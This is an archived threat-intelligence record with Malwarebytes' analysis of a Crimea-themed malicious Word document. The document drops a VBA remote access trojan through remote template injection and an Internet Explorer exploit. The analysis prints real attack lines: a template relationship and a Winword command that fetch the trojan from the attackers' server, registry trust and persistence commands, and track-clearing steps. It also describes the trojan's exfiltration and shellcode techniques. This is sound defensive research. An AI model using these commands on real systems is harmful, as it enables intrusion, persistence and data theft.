{
    "id": "ab52ddcc-b18d-495a-adce-f52ca7d68c75",
    "created_at": "2023-01-12T15:07:43.425675Z",
    "updated_at": "2025-03-27T02:12:54.551758Z",
    "deleted_at": null,
    "sha1_hash": "08b90cc1c9b8a51bf7ec74af8bc468134cfcc9aa",
    "title": "2021-07-28 - Crimea “manifesto” deploys VBA Rat using double attack vectors",
    "authors": "",
    "file_creation_date": "2022-05-28T03:32:47Z",
    "file_modification_date": "2022-05-28T03:32:47Z",
    "file_size": 2767558,
    "plain_text": "# Crimea “manifesto” deploys VBA Rat using double attack vectors\n\n**[blog.malwarebytes.com/threat-intelligence/2021/07/crimea-manifesto-deploys-vba-rat-using-double-attack-vectors/](https://blog.malwarebytes.com/threat-intelligence/2021/07/crimea-manifesto-deploys-vba-rat-using-double-attack-vectors/)**\n\nThreat Intelligence Team July 29, 2021\n\n_This blog post was authored by Hossein Jazi._\n\nOn July 21, 2021, we identified a suspicious document named “Манифест.docx” (“Manifest.docx”)\nthat downloads and executes two templates: one is macro-enabled and the other is an html object\nthat contains an Internet Explorer exploit.\n\nWhile both techniques rely on template injection to drop a full-featured Remote Access Trojan, the IE\nexploit (CVE-2021-26411) previously used by the Lazarus APT is an unusual discovery. The\nattackers may have wanted to combine a social engineering technique with a known exploit to\nmaximize their chances of infecting targets.\n\nWe also uncovered a panel used by the threat actor nicknamed “Ekipa” which seems to be a slang\nfor “equipment”. Victims are tracked and statistics include whether the IE exploit was successful or\nnot.\n\nWe could not determine who might be behind this attack based on the techniques alone, but a decoy\ndocument displayed to victims may give some clues. It contains a statement from a group\nassociating with Andrey Sergeevich Portyko and opposed to Putin’s policies on the Crimean\npeninsula.\n\n## Remote templates\n\n\n-----\n\nBy looking closer at the remote template embedded in `settings.xml.rels we noticed that it`\ncontains a full featured VBA Rat that performs the following actions:\n\nCollects victim’s info\nIdentifies the AV product running on a victim’s machine\nExecutes shell-codes\nDeletes files\nUploads and downloads files\nReads disk and file systems information\n\nThe second template is embedded in `Document.xml.rels and is loaded into the document.`\n[Looking at the loaded code we noticed that it contains an IE Exploit (CVE-2021-26411) that was once](https://enki.co.kr/blog/2021/02/04/ie_0day.html)\nused by Lazarus APT to target security researchers working on vulnerability disclosure, as reported\n[by the threat research teams at Google and](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/) [Microsoft. The shell-code executed using this exploit](https://www.microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/)\ndeploys the same VBA Rat that was loaded using remote template injection.\n\nAfter loading the remote templates the malicious document loads a decoy document in Russian\nwhich is pretty interesting. The decoy document is a statement from a group within Crimea that\nvoices opposition to Russia and specifically Putin’s policies against that peninsula. In the following,\nyou can see this statement in both Russian and English language.\n\n\n-----\n\nFigure 1: Decoy document\n\n## Document Analysis\n\nThe malicious document (“Манифест.docx”) contains two templates in `settings.xml.rels and`\n```\ndocument.xml.rels . The remote template that is located in settings.xml.rels downloads a\n\n```\nmacro weaponized template and loads it into current document. This remote template contains a\nmacro code with full-featured Rat functionality. We provide the analysis of this VBA Rat in the next\nsection.\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n<Relationship Id=\"rId1\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\nTarget=\"HtTpS:\\\\cloud-documents.com/doc/t.php?action=show_content\" TargetMode=\"External\"/>\n</Relationships>\n\n```\nThe second template is embedded in document.xml.rels and will be loaded in an object in the\nmain document. This template contains an exploit code for CVE-2021-26411.\n\n\n-----\n\nFigure 2: Document.xml.rels\n[This exploit code used by this remote template is almost similar to what has been reported by ENKI](https://enki.co.kr/blog/2021/02/04/ie_0day)\nsecurity firm.\n\n\n-----\n\nFigure 3: Exploit code\nThe shell-code executed by this exploit deploys the same VBA Rat that is also loaded using the\nremote template embedded in `settings.xml.rels . In fact, the actor tries to deploy its VBA Rat`\nusing two different methods.\n\nThe shell-code is very simple and performs the following actions. The shell-code is written in the\n[AutoHotKey scripting language and all of its actions are executed using](https://www.autohotkey.com/docs/Language.htm) `SendInput API call.`\n\nAdd VBA Rat as Trusted document to TrustedRecords registry key. By adding this Rat to this\nregistry there won’t be any need to enable the macro when this document will be opened next\ntime.\n```\n   reg add \\\"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\16.0\\\\Word\\\\Security\\\\Trusted\n   Documents\\\\TrustRecords\\\" /V https://cloud   documents.com/doc/templates/agent.dotm /t REG_BINARY /d\n   00000000000000000040230e43000000f9d99c01ffffff7f /f\"\n\n```\nGet the VBA Rat using: `Winword /w https://cloud-documents.com/doc/t.php?`\n```\n   document_show=notica\n\n```\nMake this VBA Rat persistence by creating a Scheduled task to execute it every minute:\n```\n   SCHTASKS /Create /SC MINUTE /MO 1 /TN \\\"z\\\" /TR winword.exe ' /q /w\n   %appdata%\\Microsoft\\Word\\Startup\\_.dotm\n\n```\n\n-----\n\nDelete `RunMru registry value to clear its track records.`\n\n```\nReg delete\n\n```\n```\nHKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RunMru\n\n```\n```\n\\f\n\n```\n\n## VBA Rat analysis (Remote Template)\n\nThe remote template contains `Document_Open and` `Document_Close which are activated upon`\nopening and closing the document.\n\n**Document_Open:**\n\nThe `Document_open function checks if the active document has the docx extension and if that is`\nthe case it shows the hidden content (decoy content). Then, if the active document name is\n```\n\"_.dotm\" (this is the case when the machine is already infected with this Rat), it calls\n\"ConnectCP\" function. The ConnectCP function is responsible for collecting victim’s info by calling\n\n```\nthe following functions as well as a value named `\"cve\" in` `CustomDocumentProperties (this`\nvalue is being set during the first execution of this document).\n\nAfter collecting data, it converts it into a json format by using the `JsonConvertor function. The`\ncollected data later is used by the `SCI function to be sent to the server and receive commands.`\n\ngetUUID: Gets UUID by executing `\"SELECT * FROM Win32_ComputerSystemProduct\"`\ngetOS: Gets OS type by executing `\"SELECT * FROM Win32_OperatingSystem\"`\narch: Returns OS architecture\ngetCPU: Gets CPU info by executing `\"SELECT * FROM Win32_Processor\"`\ngetGPU: Gets GPU info by executing `\"SELECT * FROM Win32_VideoController\"`\ngetRAM: Gets physical memory capacity by executing \"SELECT * FROM\n```\n   Win32_PhysicalMemory\"\n\n```\ngetStorage: Gets available hard drive space by executing `\"Select * from`\n```\n   Win32_LogicalDisk Where DriveType = 3\"\n\n```\ngetName: Gets computer name, user name and domain name\ngetRole: Identify if the victim has admin role or not.\n\nFigure 4: GetRole\n\n\n-----\n\ngetAV: Gets Anti-Virus product info including the AV name, AV status (enabled or disabled) and\nAV signature stature (outdated or actual). To get these info it executes `\"Select * from`\n```\n   AntiVirusProduct\" to get the list of active Anti Virus products and then calls DisplayName\n\n```\nto get the AV name and then identify the AV status and AV signature status using the product\nstate codes. As an example if the product state code is 266240, it means that the AV product is\nenabled and its signature is updated.\n\nFigure 5: GetAV\nAt the end, the `ConnectCP function calls the` `StartTimer function to start the task execution`\nprocedure ( ExecuteTasks function). This function creates a timer that calls the `ExecuteTasks`\nfunction every 10 minutes to execute the tasks received from the server.\n\nFigure 6: Set Timer\nIf the active document name is not `\"_.dotm\" (The machine has not been infected before with this`\nVBA Rat), it calls a function named `InstallFromExp after making sure it is not running within a`\nSandbox environment and its extension is `dotm . The attacker checks the value of the following`\nregistry key and if the value is equal to one it won’t execute the `InstallFromExp .`\n```\nHKCU\\Software\\Microsoft\\Office\\&Application.Version&\\Excel\\Security\\VBAWarnings\n\n```\nThe value one for this registry key means that all untrusted and trusted macros are allowed to run\nwithout any notification which usually is a default setting for sandbox environments to run macro\nembedded documents automatically.\n```\nInstallFromExp performs the basic initialization of this Rat which includes the following three\n\n```\nactions:\n\n\n-----\n\nSets the `customDocumentProperties named` `cve` to 2021-26411 .\nMakes itself persistence by adding itself to word startup directory with `\"_.dotm\" name:`\n```\n   APPDATA\\Microsoft\\Word\\StartUp\\_.dotm\n\n```\nCleans up its track records by deleting `RunMRU registry key`\nExits the program\n\n**Document_Close**\n\nThis function also performs the installation of the Rat but by calling a different function:\n```\nInstallFromMacro . Before calling the installation function it calls the same Sandbox function to\n\n```\nmake sure it is not running into a sandbox environment and then checks if the path of the attached\ntemplate includes `http to make sure it has an embedded remote template url.`\n```\nInstallFromMacro performs initialization of the Rat which includes the following three actions:\n\n```\nOpens the attached remote template as a document and extract the contents of the comments\nsection of the BuiltInDocumentProperties and spilts it by “|”. If the OS is 32 bit it takes the first\npart of the the comments and puts it in `skd variable and if the OS is 64 bit it takes the second`\npart of the comments section and puts it into `skd . The` `skd variable later is used as a`\nparameter for `AddTask function.`\nSets the `customDocumentProperties named “cve” to “MACRO”.`\nMake itself persistence by adding itself to word startup directory with “_.dotm” name:\n```\n   APPDATA\\Microsoft\\Word\\StartUp\\_.dotm\n\n```\nCalls `AddTask function`\nCleans up its track records by deleting `RunMRU registry key`\n\nFigure 7: Rat installation\n\n## AddTask (Shell-Code execution using EnumWindows)\n\nThis function base64 decodes the content from the `skd variable that has been set in`\n```\nInstallFromMacro function and executes it using VirtualProtect and EnumWindows . In fact\n\n```\nthe content of the `skd is a small shell-code that has been executed within the memory without`\nbeing written into disk. The actor has used an interesting API call for ShellCode execution. Instead of\nusing well known API calls for shell code execution which can easily get flagged by AV products such\nas `VirtualAlloc,` `WriteProcessMemory, and` `CreateThread the actor has used`\n```\nEnumWindows to execute its shell-code\n\n```\n\n-----\n\nThe second argument of `EnumWindows is an application-defined value to be passed to the callback`\nfunction. By providing the address of the shell-code from `VirtualProtect as second parameter to`\nthis function, it can execute the Shell-code.\n\nFigure 8: AddTask\nThe executed shell-code is very small and it just persists by creating a Scheduled task to execute it\nevery minute:\n```\nSCHTASKS /Create /SC MINUTE /MO 1 /TN \\\"z\\\" /TR winword.exe ' /q /w\n%appdata%\\Microsoft\\Word\\Startup\\_.dotm\n\n```\nSimilar to the shell-code used in IE exploit, this shell-code is also written using AutoHotKey scripting\nlanguage and it is using `SendmessageA and` `SendInput to simulate keystrokes and perform its`\nactions.\n\nFigure 9:\n\nShell-code API and function calls resolving\n\n## ExecuteTasks\n\nThis is the main function of this VBA Rat that receives the command from the server in Json format\nand then parses the json file and executes the command. Each time this function can execute three\ntasks. This has probably been set to avoid making noise in network activities which might be\ndetected by security products.\n\n\n-----\n\nFigure 10: Executes tasks\nTo receive the tasks from the server this function receives one argument which is a function named\n```\nSCI . SCI function sends the collected data by ConnectCP function in json format in a HTTP\nPOST request and receives the response from the server which includes the tasks that need to be\n\n```\nexecuted in JSON format.\n\nFigure 11: Send info to server and receive commands\nHere is the list of commands that can be executed by this Rat. After executing each task the results\nof task execution will be sent to server.\n\n**ReadDisks**\n\n\n-----\n\nIt gets each Drive information on the machine using `Scripting.FileSystemObject.Drives`\nobject. It then creates a JSON object which includes the following key and values for each drive\nobject:\n\nIsReady: this value sets to true if the drive is ready\nLabel: gets name of the drive which will be either ShareName or VolumeName. This depends\non whether the drive is remote or not\nFilesystem: gets the file system in use for the drive\nFreespace: gets the amount of free space for the drive in KB\nName: gets the drive letter\nIsDirectory: This value is always True\n\nFigure 12: Read Disks\n\n**ReadFileSystem**\n\nThis function gets a Folder object corresponding to the folder in a specified path using\n```\nScripting.FileSystemObject.GetFolder object and then extracts it name, size, date last\n\n```\nmodified and puts them into a Json object. It also extracts the same information for all sub-folders\nand files in that Folder object and adds them to the Json object.\n\n**Download File**\n\nThis function reads a specified file using `Adobe.Recordset` and sends the data to sever using\nHTTP POST request.\n\n\n-----\n\nFigure 13: Download File\n\n**Upload File**\n\nThis module receives a file from the server and writes it into specified file.\n\n\n-----\n\nFigure 14: Upload File\n\n**DeleteFile**\n\nThis function uses Kill function to delete the specified file or directory.\n\n**Terminate**\n\nThis function terminates the execution of the Rat and exits the application.\n\n**Execute**\n\nThis function executes the received shell-code from the server using the same method used in\n\n`AddTask function in which it has used` `VirtualProtect` and `EnumWindows to execute the shell-`\ncode.\n\nFigure 15: Execute Shell-code\n\n**ChangeTiming**\n\nThis function resets the timer that is used to execute tasks every 10 minutes by calling `EndTimer to`\nkill the timer and then calling StartTimer to start a new timer\n\n\n-----\n\nFigure 16: Send results\n\n## Attacker panel\n\nWe were able to access to the panel used by the attacker. The panel’s main page includes the list of\nvictims with some information about them including: IP address, date and time, NTLM, Windows\nversion, Windows Architecture, Office version, Office architecture, IE version, Exploited (shows if the\nIE zero day was successful or not), Loader (shows if the VBA Rat successfully executed or not) and\nnote.\n\nFigure 17: The panel\nThe panel is written in PHP with a backed SQL database to store data. This `install.php initializes`\nthe SQL database.\n\n\n-----\n\nFigure 18: Install.php\n```\nstats.php is the file that performs the main actions of this Rat that matches the functionalities we\n\n```\nreported here. It also has some more functions including: `delete_task, disable_task,`\n```\nenable_task, show_tasks, add_task, format_task and add_user.\n\n```\n\n-----\n\nFigure 19: Stats.php\n\n\n-----\n\nFigure 20: Stats.php\n\n## Conclusion\n\nIn this blog post we have analyzed an attack in which threat actors have used two different methods\nto infect their victims. Both techniques have been loaded by malicious documents using the template\ninjection technique. The first template contains a url to download a remote template that has an\nembedded full-featured VBA Rat. This Rat has several different capabilities including downloading,\nuploading and executing files. The second template is an exploit for CVE-2021-26411 which\nexecutes a shell-code to deploy the same VBA Rat. The VBA Rat is not obfuscated but still has used\nsome interesting techniques for shell-code injection.\n\nAs the conflict between Russia and Ukraine over Crimea continues, cyber attacks have been\nincreasing as well. The decoy document contains a manifesto that shows a possible motive (Crimea)\nand target (Russian and pro-Russian individuals) behind this attack. However, it could also have\nbeen used as a false flag.\n\n\n-----\n\n## IOCs\n\n**Maldocs:**\n03eb08a930bb464837ede77df6c66651d526bab1560e7e6e0e8466ab23856bac\n\n0661fc4eb09e99ba4d8e28a2d5fae6bb243f6acc0289870f9414f9328721010a\n\n**Remote template:**\n\nfffe061643271155f29ae015bca89100dec6b4b655fe0580aa8c6aee53f34928\n\n**C2 server:**\n\ncloud-documents[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-28 - Crimea “manifesto” deploys VBA Rat using double attack vectors.pdf"
    ],
    "report_names": [
        "2021-07-28 - Crimea “manifesto” deploys VBA Rat using double attack vectors.pdf"
    ],
    "threat_actors": [
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bdbf873a-048d-4c5d-9d92-922327cc83a8",
            "created_at": "2023-01-06T13:46:39.387696Z",
            "updated_at": "2025-03-27T02:00:03.071819Z",
            "deleted_at": null,
            "main_name": "DEV-0586",
            "aliases": [
                "Ruinous Ursa",
                "Cadet Blizzard"
            ],
            "source_name": "MISPGALAXY:DEV-0586",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536063,
    "ts_updated_at": 1743041574,
    "ts_creation_date": 1653708767,
    "ts_modification_date": 1653708767,
    "files": {
        "pdf": "https://archive.orkl.eu/08b90cc1c9b8a51bf7ec74af8bc468134cfcc9aa.pdf",
        "text": "https://archive.orkl.eu/08b90cc1c9b8a51bf7ec74af8bc468134cfcc9aa.txt",
        "img": "https://archive.orkl.eu/08b90cc1c9b8a51bf7ec74af8bc468134cfcc9aa.jpg"
    }
}